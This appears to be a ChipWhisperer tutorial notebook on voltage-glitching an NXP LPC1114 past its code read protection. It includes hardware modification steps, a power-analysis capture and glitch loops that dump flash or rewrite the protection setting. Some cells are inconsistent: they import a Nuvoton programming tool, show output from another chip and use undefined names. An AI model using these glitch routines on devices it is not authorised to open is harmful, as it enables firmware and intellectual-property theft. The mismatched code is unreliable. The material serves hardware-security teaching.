{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Background on Code Read Protection\n",
    "\n",
    "To help protect proprietary code from being dumped via a bootloader or a debugging interface, many microcontrollers include some mechanism that locks down the flash and prevents reads. In the case of NXP's LPC1114, this is done by reading a value from flash during the boot sequence, with different values corresponding to different levels of protection. As is shown in the figure below, there are 4 levels of read protection, with the rest of the values representing an unlocked device. This makes this a great target for glitching, as corrupting one bit from this read will unlock the device and give us full access. Since higher CRP levels are harder (or in the case of CRP level 3, \"impossible\") to remove, we'll be using the device in CRP level 1.\n",
    "\n",
    "| Name    | Value in FLASH  | JTAG/SWD | Serial Bootloader (ISP) | Notes                                                                                |\n",
    "|---------|-----------------|----------|-------------------------|--------------------------------------------------------------------------------------|\n",
    "| NO_ISP  | 0x4E697370      | enabled  | disabled                |                                                                                      |\n",
    "| CRP1    | 0x12345678      | disabled | subset                  | Read memory disabled. Sector erase and mass erase possible (which also removes CRP). |\n",
    "| CRP2    | 0x87654321      | disabled | subset                  | Read memory disabled. Mass erase only (which also removes CRP).                      |\n",
    "| CRP3    | 0x43218765      | disabled | disabled                | Claimed impossible to recover from since no reprogramming interface.                 |\n",
    "| INVALID | Any other Value | enabled  | enabled                 |                                                                                      |\n",
    "\n",
    "This was first published by Chris Gerlinsky at RECON Brussels. You can [see his slides here](https://recon.cx/2017/brussels/resources/slides/RECON-BRX-2017-Breaking_CRP_on_NXP_LPC_Microcontrollers_slides.pdf) or watch his [presentation here](https://www.youtube.com/watch?v=98eqp4WmHoQ). It was [re-created by Dmitry Nedospasov on his blog](https://toothless.co/blog/bootloader-bypass-part1/), which has additional details and examples of how you can achieve this attack.\n",
    "\n",
    "We'll be recreating the attack with the ChipWhisperer, to show the value of this modular platform in quickly testing new attacks.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Hardware Setup\n",
    "\n",
    "This tutorial requires some hardware setup. We will use a \"LPC-P1114\" development board, available from Mouser or Digikey.\n",
    "\n",
    "### ChipWhisperer-Lite (CW1173) with LPC-P1114 Development Board\n",
    "\n",
    "To allow the ChipWhisperer-Lite to interface with this board, we'll need to make some small modifications to the board:\n",
    "\n",
    "1. Short jumper BLD_E to put the device in bootloader mode.\n",
    "2. Solder a wire from GND to P0_3 (Second column from the left, fourth row from the bottom) to put the bootloader in UART mode.\n",
    "3. Remove C1 and C4 from the board.\n",
    "4. Cut the traces on 3.3V_CORE and 3.3V_IO_E.\n",
    "5. Add a 12-ohm resistor on the 3.3V_CORE jumper.\n",
    "6. Add an SMA connector to the board and connect Vcc to the center pin and GND to one of the outside pins (or just use a jumper instead of fancy SMA).\n",
    "7. Add a header pin/wire to RST (First column from the left, third row from the bottom). The CW-Lite needs two connection points, as we'll be both resetting this pin and triggering off of it.\n",
    "\n",
    "The following shows the required modifications:\n",
    "\n",
    "![Image show LPC-P1114 Modifications](img/A9_LPC1114_CHANGES.jpg)\n",
    "\n",
    "Next, we'll need to connect the CW-Lite to the connect pins on the dev board to pins on CW-Lite's 20 pin header:\n",
    "\n",
    "1. Connect pin 1 of UEXT (Vcc) to pin 3 on the CW-Lite\n",
    "2. Connect pin 2 of UEXT (GND) to pin 2 on the CW-Lite\n",
    "3. Connect pin 3 of UEXT (TXD) to pin 10 on the CW-Lite\n",
    "4. Connect pin 4 of UEXT (RXD) to pin 12 on the CW-Lite\n",
    "5. Connect RST (the 3 header pins soldered on) to pins 5 (nRST) and 16 (GPIO4) on the CW-Lite\n",
    "7. Finally, attach an SMA cable between the one you added to the board and the GLITCH connector on the CW-Lite. If you'd like instead you can also use a SMA Tee to do both measurement & glitch.\n",
    "\n",
    "![Image show LPC-P1114 Connections](img/A9_LPC_CWLITE_Conn.jpg)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Exploration and Attack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "python"
    }
   },
   "outputs": [],
   "source": [
    "print(\"haldo\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "vscode": {
     "languageId": "python"
    }
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "(ChipWhisperer NAEUSB WARNING|File naeusb.py:743) Your firmware (0.64) is outdated - latest is 0.65 See https://chipwhisperer.readthedocs.io/en/latest/firmware.html for more information\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "scope.gain.mode                          changed from low                       to high                     \n",
      "scope.gain.gain                          changed from 0                         to 30                       \n",
      "scope.gain.db                            changed from 5.5                       to 24.8359375               \n",
      "scope.adc.basic_mode                     changed from low                       to rising_edge              \n",
      "scope.adc.samples                        changed from 24400                     to 5000                     \n",
      "scope.adc.trig_count                     changed from 2166228                   to 13658720                 \n",
      "scope.clock.adc_src                      changed from clkgen_x1                 to clkgen_x4                \n",
      "scope.clock.adc_freq                     changed from 159999996                 to 96000000                 \n",
      "scope.clock.adc_rate                     changed from 159999996.0               to 96000000.0               \n",
      "scope.clock.clkgen_div                   changed from 1                         to 26                       \n",
      "scope.clock.clkgen_freq                  changed from 192000000.0               to 7384615.384615385        \n",
      "scope.io.tio1                            changed from serial_tx                 to serial_rx                \n",
      "scope.io.tio2                            changed from serial_rx                 to serial_tx                \n",
      "scope.io.hs2                             changed from None                      to clkgen                   \n"
     ]
    }
   ],
   "source": [
    "import sys\n",
    "import binascii\n",
    "\n",
    "import time\n",
    "import logging\n",
    "import os\n",
    "from collections import namedtuple\n",
    "import numpy as np\n",
    "import chipwhisperer as cw\n",
    "from tqdm import trange\n",
    "\n",
    "def fb_setup(scope: cw.scopes.OpenADC):\n",
    "\tscope.default_setup()\n",
    "\t# Original attack done with 100 MHz clock - can be helpful to run this\n",
    "\t# 2x faster to get better resolution, which seems useful for glitching certain boards.\n",
    "\t# But if you want to use DPA you need to leave this set to '1'\n",
    "\tfreq_multiplier = 1\n",
    "\n",
    "\t#Initial Setup\n",
    "\tscope.adc.samples = 10000\n",
    "\tscope.adc.offset = 0\n",
    "\tscope.clock.adc_src = \"clkgen_x1\"\n",
    "\tscope.trigger.triggers = \"tio4\"\n",
    "\tscope.io.hs2 = None\n",
    "\n",
    "\tscope.io.tio1 = \"serial_rx\"\n",
    "\tscope.io.tio2 = \"serial_tx\"\n",
    "\tscope.adc.basic_mode = \"rising_edge\"\n",
    "\tscope.clock.clkgen_freq = 160000000 * freq_multiplier\n",
    "\tscope.glitch.clk_src = \"clkgen\"\n",
    "\tscope.glitch.trigger_src = \"ext_single\"\n",
    "\tscope.glitch.output = \"enable_only\"\n",
    "\n",
    "def target_setup(target):\n",
    "\ttarget.baud = 0\n",
    "\ttarget.key_cmd = \"\"\n",
    "\ttarget.go_cmd = \"\"\n",
    "\ttarget.output_cmd = \"\"\n",
    "\n",
    "scope: cw.scopes.OpenADC = cw.scope()\n",
    "target = cw.target(scope)\n",
    "fb_setup(scope)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "vscode": {
     "languageId": "python"
    }
   },
   "outputs": [],
   "source": [
    "PLATFORM = \"CWLITEXMEGA\"\n",
    "def reconnect():\n",
    "\ttry:\n",
    "\t\tscope.dis()\n",
    "\t\ttarget.dis()\n",
    "\texcept:\n",
    "\t\tpass\n",
    "\tPLATFORM = \"CWLITEXMEGA\"\n",
    "\t%run \"../../Setup_Scripts/Setup_Generic.ipynb\"\n",
    "\tfb_setup(scope)\n",
    "\n",
    "def glitch_enable(scope):\n",
    "\tscope.io.glitch_lp = True\n",
    "\tif scope._is_husky:\n",
    "\t\t\tscope.glitch.enabled = True\n",
    "\t# this value is for CW-Lite/Pro; for CW-Husky, refer to Fault 1_1\n",
    "\tscope.glitch.width = 40"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "We need to talk to this device. Rather than implement our own protocol interface, we are going to be lazy. Luckily, an existing 'nxprog' module implements almost all the required commands. We can just connect ChipWhisperer's serial port to this module and get going: "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Let's get an idea what this looks like. We can for example connect to the device and check the serial number:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "vscode": {
     "languageId": "python"
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Device ID: 0x3650\n",
      "CID: 0xDA\n",
      "UID: 0x00590C02\n",
      "UCID: 0xFFFFFFFF\n",
      "----- Chip Configuration ----\n",
      "Raw config bytes:\tFF FF FF FF FF \n",
      "MCU Boot select:\tAPROM\n",
      "LDROM size:\t\t0 Bytes\n",
      "APROM size:\t\t18432 Bytes\n",
      "Security lock:\t\tUNLOCKED\n",
      "P2.0/Nrst reset:\tenabled\n",
      "On-Chip Debugger:\tdisabled\n",
      "OCD halt PWM output:\ttri-state pins are used as PWM outputs\n",
      "Brown-out detect:\tenabled\n",
      "Brown-out voltage:\t2.2V\n",
      "Brown-out reset:\tenabled\n",
      "Brown-out inhibits IAP:\tenabled\n",
      "WDT status:\t\tWDT is Disabled. WDT can be used as a general purpose timer via software control.\n"
     ]
    }
   ],
   "source": [
    "import nuvoispy.nuvoicpy as nuvoicpy\n",
    "\n",
    "with nuvoicpy.NuvoICP() as icp:\n",
    "\tprint(icp.get_device_info())\n",
    "\ticp.read_config().print_config()\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## DPA on Fuse Bytes\n",
    "\n",
    "Assuming this all works, we have a few paths forward. If you don't have a locked device, you can perform a basic FF vs 00 DPA type attack! To do this, ensure you are connected to the *measure* input on your LPC1114 board. We'll then set the bytes to 0xFFFFFFF and 0x000000, to see where the bytes might be loaded.\n",
    "\n",
    "The first thing to do is to build a simple capture function:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {
    "vscode": {
     "languageId": "python"
    }
   },
   "outputs": [],
   "source": [
    "%matplotlib notebook\n",
    "import matplotlib.pylab as plt\n",
    "\n",
    "from nuvoispy.config import ConfigFlags\n",
    "\n",
    "from nuvoispy.libicp import *\n",
    "\n",
    "\n",
    "\n",
    "def flash_image(nuvo:nuvoicpy.NuvoICP):\n",
    "    \"\"\"\n",
    "    Flash the image to the device\n",
    "    \"\"\"\n",
    "    print(\"Programming flash...\")\n",
    "    nuvo.program(\"nuvoispy/GPIO-1ms-LED-500ms-plus-LDROM-dump.bin\")\n",
    "    print(\"Done!\")\n",
    "\n",
    "def set_crp(nuvo:nuvoicpy.NuvoICP, config: ConfigFlags, image=None):\n",
    "    \"\"\"\n",
    "    Set CRP value\n",
    "    \"\"\"\n",
    "    nuvo.write_config(config)\n",
    "    print(\"Done!\")\n",
    "\n",
    "\n",
    "def capture_crp(config: ConfigFlags, num_tries=1000, bypass_oserror=True):\n",
    "    \"\"\"\n",
    "    Capture an average power trace for a given CRP level.\n",
    "    \"\"\"\n",
    "    ref_list = []\n",
    "    with nuvoicpy.NuvoICP() as nuvo:\n",
    "        try:\n",
    "            set_crp(nuvo, config)\n",
    "        except IOError as e:\n",
    "            print(\"IOError - assumed CRP enabled. Error: \" + str(e))\n",
    "        print(\"Performing DPA capture for %s\"%str(config))\n",
    "        for i in range(0, num_tries):\n",
    "            # icp_exit()\n",
    "            scope.arm()\n",
    "            icp_reentry_glitch()\n",
    "            scope.capture()\n",
    "            ref_list.append(scope.get_last_trace())\n",
    "    \n",
    "    return np.mean(ref_list, axis=0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "scrolled": false,
    "vscode": {
     "languageId": "python"
    }
   },
   "outputs": [],
   "source": [
    "%matplotlib notebook\n",
    "import matplotlib.pylab as plt\n",
    "import numpy as np\n",
    "reconnect()\n",
    "scope.gain.setGain(30)\n",
    "scope.gain.setMode(\"high\")\n",
    "time.sleep(0.1)\n",
    "def write_default():\n",
    "    with nuvoicpy.NuvoICP() as nuvo:\n",
    "        nuvo.write_config(ConfigFlags())\n",
    "\n",
    "def test_config():\n",
    "\twrite_config = ConfigFlags([0,0,0,0,0])\n",
    "\t# # the resulting config will be 0x86 0x07 0x00 0x00 0x00\n",
    "\twrite_config.set_lock(False)\n",
    "\twrite_config.RPD = 1\n",
    "\twrite_config.set_ldrom_boot(False)\n",
    "\twrite_config.set_ldrom_size(0)\n",
    "\treturn write_config\n",
    "default_config = ConfigFlags()\n",
    "write_config = test_config()\n",
    "print(\"Testing CRP for default config...\")\n",
    "trace_1s = None\n",
    "trace_1s = capture_crp(ConfigFlags([0xFF,0xFF,0xFF,0xFF,0xFF]),10)\n",
    "print(\"\\n\\n\")\n",
    "print(\"Testing CRP for the following config:\")\n",
    "write_config.print_config()\n",
    "trace_0s = None\n",
    "trace_0s = capture_crp(write_config, 10)\n",
    "write_default()\n",
    "\n",
    "plt.plot(trace_1s - trace_0s)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "vscode": {
     "languageId": "python"
    }
   },
   "outputs": [],
   "source": [
    "%matplotlib notebook\n",
    "default_config = ConfigFlags()\n",
    "write_config = test_config()\n",
    "print(\"Testing CRP for default config...\")\n",
    "trace_1s = None\n",
    "trace_1s = capture_crp(ConfigFlags([0xFF,0xFF,0xFF,0xFF,0xFF]),10)\n",
    "print(\"\\n\\n\")\n",
    "print(\"Testing CRP for the following config:\")\n",
    "write_config.print_config()\n",
    "trace_0s = None\n",
    "trace_0s = capture_crp(write_config, 10)\n",
    "write_default()\n",
    "\n",
    "plt.plot(trace_1s - trace_0s)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "scrolled": true,
    "vscode": {
     "languageId": "python"
    }
   },
   "outputs": [],
   "source": [
    "%matplotlib notebook\n",
    "print(\"Testing CRP for default config...\")\n",
    "\n",
    "# import matplotlib.pylab as plt\n",
    "# import numpy as np\n",
    "\n",
    "# nxpdev = CWDevice(scope, target)\n",
    "\n",
    "# trace_unlocked = capture_crp(nxpdev, 0x02345688) #Wrong value - unlocked"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "python"
    }
   },
   "outputs": [],
   "source": [
    "trace_1s"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "python"
    }
   },
   "outputs": [],
   "source": [
    "trace_locked = capture_crp(nxpdev, 0x12345678) #Same hamming weight - but locked\n",
    "plt.plot(trace_unlocked - trace_locked)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Glitching Fuse Bytes\n",
    "\n",
    "First, check that your device is locked. The following should result in an exception when you attemp to run read_block(), which is disallowed now:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "python"
    }
   },
   "outputs": [],
   "source": [
    "nxpdev = CWDevice(scope, target, print_debug=True)\n",
    "\n",
    "#Need to enter ISP mode before initializing programmer object\n",
    "nxpdev.isp_mode()\n",
    "nxpp = nxpprog.NXP_Programmer(\"lpc1114\", nxpdev, 12000)\n",
    "\n",
    "#Examples of stuff you can do:\n",
    "print(nxpp.get_serial_number())\n",
    "print(nxpp.read_block(0, 4))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Yikes! Let's move the cable to the **glitch** output on the ChipWhisperer, so we can do VCC glitching on the target. Now we'll scan a range that seems interesting - the following offset_range works in practice. You'll notice it doesn't exactly match up with the DPA results, which is something that requires more thought (we're not exactly sure on what the device is doing):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "python"
    }
   },
   "outputs": [],
   "source": [
    "\n",
    "Range = namedtuple(\"Range\", [\"min\", \"max\", \"step\"])\n",
    "offset_range = Range(5180*freq_multiplier, 5185*freq_multiplier, 1)\n",
    "repeat_range = Range(7*freq_multiplier, 40*freq_multiplier, 1)\n",
    "\n",
    "scope.glitch.repeat = repeat_range.min"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true,
    "vscode": {
     "languageId": "python"
    }
   },
   "outputs": [],
   "source": [
    "import time\n",
    "from binascii import unhexlify\n",
    "\n",
    "print(\"Attempting to glitch LPC Target\")\n",
    "\n",
    "scope.io.target_pwr = False\n",
    "time.sleep(0.2)\n",
    "scope.io.target_pwr = True\n",
    "time.sleep(0.2)\n",
    "\n",
    "\n",
    "nxpdev = CWDevice(scope, target)\n",
    "\n",
    "done = False\n",
    "while done == False:\n",
    "    scope.glitch.ext_offset = offset_range.min\n",
    "    if scope.glitch.repeat >= repeat_range.max:\n",
    "        scope.glitch.repeat = repeat_range.min\n",
    "    while scope.glitch.ext_offset < offset_range.max:\n",
    "\n",
    "        scope.io.nrst = 'low'\n",
    "        time.sleep(0.05)\n",
    "        scope.arm()\n",
    "        scope.io.nrst = 'high'\n",
    "        target.ser.flush()\n",
    "        \n",
    "        print(\"Glitch offset %4d, width %d........\"%(scope.glitch.ext_offset, scope.glitch.repeat), end=\"\")\n",
    "\n",
    "        #scope.capture()\n",
    "        #plot.send(scope.get_last_trace())\n",
    "        \n",
    "        time.sleep(0.05)\n",
    "        try:\n",
    "            nxpp = nxpprog.NXP_Programmer(\"lpc1114\", nxpdev, 12000)\n",
    "\n",
    "            try:\n",
    "                data = nxpp.read_block(0, 4)\n",
    "                print(\"[SUCCESS]\\n\")\n",
    "                print(\"  Glitch OK! Beginning dump...\")\n",
    "                \n",
    "                datafile = None\n",
    "                \n",
    "                for i in range(0, 0x7FFF, 16):\n",
    "                    data = nxpp.read_block(i, 16)\n",
    "                    st = \" \".join([\"%02X\"%ord(b) for b in data])\n",
    "                    print(st)\n",
    "                    \n",
    "                    if datafile is None:\n",
    "                        datafile = data\n",
    "                    else:\n",
    "                        datafile += data\n",
    "                    \n",
    "                \n",
    "                with open(\"lpc1114_dump.bin\", \"wb\") as f:\n",
    "                    f.write(unhexlify(datafile))\n",
    "                with open(\"lpc1114_dump_ascii.bin\", \"wb\") as f:\n",
    "                    f.write(datafile.encode('latin-1'))    \n",
    "                \n",
    "                \n",
    "                done = True\n",
    "                break\n",
    "\n",
    "            except IOError:\n",
    "                print(\"[NORMAL]\")\n",
    "    \n",
    "        except IOError:\n",
    "            print(\"[FAILED]\")\n",
    "            pass\n",
    "    \n",
    "        scope.glitch.ext_offset += offset_range.step\n",
    "\n",
    "    scope.glitch.repeat += repeat_range.step"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "What if you just want to \"unlock\" the device? In which case you can modify the code to dump the first 4K (we need 4K since the bootloader erases 4K at a time). With the device unlocked, we can do an erase-program cycle with a modified CRP:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "python"
    }
   },
   "outputs": [],
   "source": [
    "import time\n",
    "\n",
    "print(\"Attempting to glitch LPC Target\")\n",
    "\n",
    "scope.io.target_pwr = False\n",
    "time.sleep(0.2)\n",
    "scope.io.target_pwr = True\n",
    "time.sleep(0.2)\n",
    "\n",
    "nxpdev = CWDevice(scope, target)\n",
    "\n",
    "done = False\n",
    "while done == False:\n",
    "    scope.glitch.ext_offset = offset_range.min\n",
    "    if scope.glitch.repeat >= repeat_range.max:\n",
    "        scope.glitch.repeat = repeat_range.min\n",
    "    while scope.glitch.ext_offset < offset_range.max:\n",
    "\n",
    "        scope.io.nrst = 'low'\n",
    "        time.sleep(0.05)\n",
    "        scope.arm()\n",
    "        scope.io.nrst = 'high'\n",
    "        target.ser.flush()\n",
    "        \n",
    "        print(\"Glitch offset %4d, width %d........\"%(scope.glitch.ext_offset, scope.glitch.repeat), end=\"\")\n",
    "\n",
    "        time.sleep(0.05)\n",
    "        try:\n",
    "            nxpp = nxpprog.NXP_Programmer(\"lpc1114\", nxpdev, 12000)\n",
    "\n",
    "            try:\n",
    "                data = nxpp.read_block(0, 4)            \n",
    "                print(\"[SUCCESS]\\n\")\n",
    "                print(\"  Glitch OK! Reading first 4K...\")\n",
    "                block = None\n",
    "                #Deal with crappy ChipWhisperer serial buffer by splitting read up\n",
    "                for i in range(0, 4096, 32):\n",
    "                    if block is None:\n",
    "                        block = nxpp.read_block(i, 32)\n",
    "                    else:\n",
    "                        block += nxpp.read_block(i, 32)\n",
    "                \n",
    "                print(\"  Adjusting CRP...\")\n",
    "                block = [ord(t) for t in block]\n",
    "                set_crp(nxpp, 0, block)\n",
    "                done = True\n",
    "                break\n",
    "\n",
    "            except IOError:\n",
    "                print(\"[NORMAL]\")\n",
    "    \n",
    "        except IOError:\n",
    "            print(\"[FAILED]\")\n",
    "            pass\n",
    "    \n",
    "        scope.glitch.ext_offset += offset_range.step\n",
    "\n",
    "    scope.glitch.repeat += repeat_range.step"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "python"
    }
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "vscode": {
     "languageId": "python"
    }
   },
   "outputs": [],
   "source": [
    "scope.dis()\n",
    "target.dis()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
